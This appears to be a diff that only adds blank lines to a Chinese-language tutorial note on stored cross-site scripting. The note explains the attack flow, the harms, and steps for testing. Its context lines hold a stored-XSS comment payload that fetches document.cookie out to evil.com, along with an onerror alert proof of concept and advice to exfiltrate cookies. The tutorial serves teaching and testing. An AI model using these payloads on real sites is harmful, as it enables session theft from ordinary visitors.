@@ -18,6 +18,7 @@ tags: [xss, 存储型, 漏洞原理]
 攻击者把恶意脚本提交到网站并存储在服务器上，之后所有访问该页面的用户都会自动执行这段脚本——相当于有人在公共公告栏上贴了一张隐藏的窃听器，路过的人都被录音了。
 
 攻击者提交恶意留言→服务器存入数据库（未过滤）→普通用户访问页面→浏览器执行恶意脚本
+
 ```
 # ⭐ 攻击者提交恶意内容（POST 请求）
 POST /comment HTTP/1.1
@@ -34,6 +35,7 @@ GET /product/123 HTTP/1.1
 <div class="comment">这条商品真好！<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script></div>
 #                                  ↑ 每个用户的浏览器都会执行这段代码！
 ```
+
 ## 3.危害
 | 危害        | 说明                                          | 严重程度 |
 | --------- | ------------------------------------------- | ---- |
@@ -67,6 +69,7 @@ GET /product/123 HTTP/1.1
 6. **升级 PoC → 证明危害**
  用 fetch() 或 new Image().src=... 把 Cookie 发出来，证明可窃取会话。
 ⭐ 升级 PoC 示例
+
 ```
 # 基础验证（低危）
 <img src=x onerror=alert(document.cookie)>
